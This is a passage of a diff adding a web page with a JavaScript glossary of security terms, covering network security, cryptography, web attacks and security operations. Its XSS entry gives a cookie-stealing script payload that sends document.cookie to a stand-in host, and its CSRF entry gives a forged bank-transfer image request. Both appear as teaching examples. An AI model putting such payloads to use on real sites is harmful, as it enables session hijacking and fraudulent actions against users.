+                example: 'A DMZ (demilitarized zone) places public-facing servers between two firewalls to protect the internal network.',
+                relatedTerms: ['firewall', 'ids', 'vpn', 'dmz']
+            },
+            'dmz': {
+                term: 'DMZ (Demilitarized Zone)',
+                category: 'Network Security',
+                definition: 'A network segment that sits between an internal network and the internet, containing public-facing services. Provides an additional layer of security for the internal network.',
+                example: 'Web servers and email gateways are typically placed in the DMZ, protected by firewalls on both sides.',
+                relatedTerms: ['network-security', 'firewall', 'segmentation']
+            },
+            'firewall': {
+                term: 'Firewall',
+                category: 'Network Security',
+                definition: 'A network security device that monitors and controls incoming and outgoing traffic based on predetermined security rules. Can be hardware, software, or cloud-based.',
+                example: 'A firewall rule allows HTTP traffic (port 80) but blocks Telnet (port 23) from external sources.',
+                relatedTerms: ['network-security', 'packet-filtering', 'ngfw']
+            },
+            'vpn': {
+                term: 'VPN (Virtual Private Network)',
+                category: 'Network Security',
+                definition: 'Technology that creates an encrypted tunnel over a public network, allowing secure remote access to private networks. Protects data in transit from interception.',
+                example: 'Remote employees connect via VPN to access company resources securely from home.',
+                relatedTerms: ['encryption', 'tunnel', 'ipsec']
+            },
+            'ids': {
+                term: 'IDS (Intrusion Detection System)',
+                category: 'Security Tools',
+                definition: 'A system that monitors network traffic or system activities for malicious activity or policy violations. Generates alerts but does not block traffic.',
+                example: 'Snort IDS detects a port scan and alerts the security team, who investigate the source.',
+                relatedTerms: ['ips', 'network-security', 'siem']
+            },
+            'ips': {
+                term: 'IPS (Intrusion Prevention System)',
+                category: 'Security Tools',
+                definition: 'A system that monitors and can actively block or prevent detected intrusions. Sits inline with traffic flow to stop attacks in real-time.',
+                example: 'An IPS detects and blocks a SQL injection attempt before it reaches the web application.',
+                relatedTerms: ['ids', 'firewall', 'ngfw']
+            },
+            'cryptography': {
+                term: 'Cryptography',
+                category: 'Security Fundamentals',
+                definition: 'The practice of securing communications through encoding so only intended recipients can read them. Encompasses encryption, decryption, hashing, and digital signatures.',
+                example: 'HTTPS uses cryptography (TLS) to encrypt web traffic between your browser and websites.',
+                relatedTerms: ['encryption', 'hash-function', 'digital-signature']
+            },
+            'symmetric-encryption': {
+                term: 'Symmetric Encryption',
+                category: 'Cryptography',
+                definition: 'Encryption where the same key is used to encrypt and decrypt data. Fast and efficient but requires secure key distribution between parties.',
+                example: 'AES-256 encrypts a file; the same 256-bit key must be used to decrypt it.',
+                relatedTerms: ['aes', 'encryption', 'key-management']
+            },
+            'asymmetric-encryption': {
+                term: 'Asymmetric Encryption',
+                category: 'Cryptography',
+                definition: 'Encryption using a pair of keys: a public key (shared openly) for encryption and a private key (kept secret) for decryption. Solves key distribution problem.',
+                example: 'Someone encrypts a message with your public key; only your private key can decrypt it.',
+                relatedTerms: ['rsa', 'ecc', 'public-key']
+            },
+            'aes': {
+                term: 'AES (Advanced Encryption Standard)',
+                category: 'Cryptography',
+                definition: 'A symmetric block cipher adopted as an encryption standard by the U.S. government. Supports 128, 192, and 256-bit keys. Widely used for data encryption.',
+                example: 'AES-256 is used by banks, governments, and security-conscious applications for data at rest.',
+                relatedTerms: ['symmetric-encryption', 'block-cipher', 'encryption']
+            },
+            'rsa': {
+                term: 'RSA',
+                category: 'Cryptography',
+                definition: 'An asymmetric encryption algorithm based on the difficulty of factoring large prime numbers. Used for secure data transmission and digital signatures.',
+                example: 'RSA-2048 is commonly used in TLS certificates to establish secure HTTPS connections.',
+                relatedTerms: ['asymmetric-encryption', 'digital-signature', 'tls']
+            },
+            'ecc': {
+                term: 'ECC (Elliptic Curve Cryptography)',
+                category: 'Cryptography',
+                definition: 'An approach to public-key cryptography based on elliptic curves over finite fields. Provides equivalent security to RSA with smaller key sizes.',
+                example: 'A 256-bit ECC key provides comparable security to a 3072-bit RSA key, making it efficient for mobile devices.',
+                relatedTerms: ['asymmetric-encryption', 'rsa', 'ecdsa']
+            },
+            'hash-function': {
+                term: 'Hash Function',
+                category: 'Cryptography',
+                definition: 'A mathematical function that converts input data into a fixed-size string (hash). One-way (cannot reverse), deterministic, and small input changes produce vastly different outputs.',
+                example: 'SHA-256 hash of "hello" is always the same 64-character string; "Hello" produces completely different output.',
+                relatedTerms: ['sha', 'integrity', 'password-hashing']
+            },
+            'owasp': {
+                term: 'OWASP',
+                category: 'Standards',
+                definition: 'Open Web Application Security Project - a nonprofit producing freely-available security resources. Best known for the OWASP Top 10, a list of critical web security risks.',
+                example: 'The OWASP Top 10 (2021) lists Broken Access Control as the #1 web security risk.',
+                relatedTerms: ['web-security', 'sql-injection', 'xss']
+            },
+            'xss': {
+                term: 'XSS (Cross-Site Scripting)',
+                category: 'Web Attacks',
+                definition: 'An attack where malicious scripts are injected into web pages viewed by other users. Allows attackers to steal session cookies, redirect users, or modify page content.',
+                example: 'A comment containing <script>document.location="evil.com?c="+document.cookie</script> steals cookies of users viewing it.',
+                relatedTerms: ['owasp', 'injection', 'csp']
+            },
+            'csrf': {
+                term: 'CSRF (Cross-Site Request Forgery)',
+                category: 'Web Attacks',
+                definition: 'An attack that tricks an authenticated user into performing unintended actions on a web application. Exploits the trust a site has in the user\'s browser.',
+                example: 'A malicious site contains <img src="bank.com/transfer?to=attacker&amount=1000"> which executes if user is logged into bank.com.',
+                relatedTerms: ['owasp', 'csrf-token', 'samesite']
+            },
+            'pentest': {
+                term: 'Penetration Testing',
+                category: 'Security Testing',
+                definition: 'An authorized simulated cyberattack to evaluate system security. Testers attempt to exploit vulnerabilities as a real attacker would, then report findings and recommendations.',
+                example: 'A penetration test discovers an unpatched server vulnerable to remote code execution, with remediation steps provided.',
+                relatedTerms: ['ethical-hacking', 'vulnerability-assessment', 'red-team']
+            },
+            'incident-response': {
+                term: 'Incident Response',
+                category: 'Security Operations',
+                definition: 'The approach to handling security incidents: preparation, detection, containment, eradication, recovery, and lessons learned. Minimizes damage and reduces recovery time.',
+                example: 'When ransomware is detected, incident response activates: isolate affected systems, assess scope, restore from backups, patch vulnerability.',
+                relatedTerms: ['siem', 'forensics', 'soc']
+            },
+            'siem': {
+                term: 'SIEM',
+                category: 'Security Tools',
+                definition: 'Security Information and Event Management - software that aggregates log data from multiple sources, analyzes it for security threats, and provides alerts and reports.',
+                example: 'Splunk SIEM correlates failed logins across systems to detect credential stuffing attacks.',
+                relatedTerms: ['log-analysis', 'soc', 'incident-response']
+            },
+            'threat-intelligence': {
+                term: 'Threat Intelligence',
+                category: 'Security Operations',
+                definition: 'Evidence-based knowledge about existing or emerging threats, including context, mechanisms, indicators, and actionable advice. Helps organizations prepare for and respond to threats.',
+                example: 'Threat intel feed reports new malware campaign targeting financial institutions with specific indicators of compromise (IOCs).',
+                relatedTerms: ['ioc', 'mitre-attack', 'osint']
+            }
+        };
+
+        // Initialize glossary
+        document.addEventListener('DOMContentLoaded', () => {
+            app.glossary.addTerms(securityGlossary);
+        });
+    </script>
+</body>
+</html>
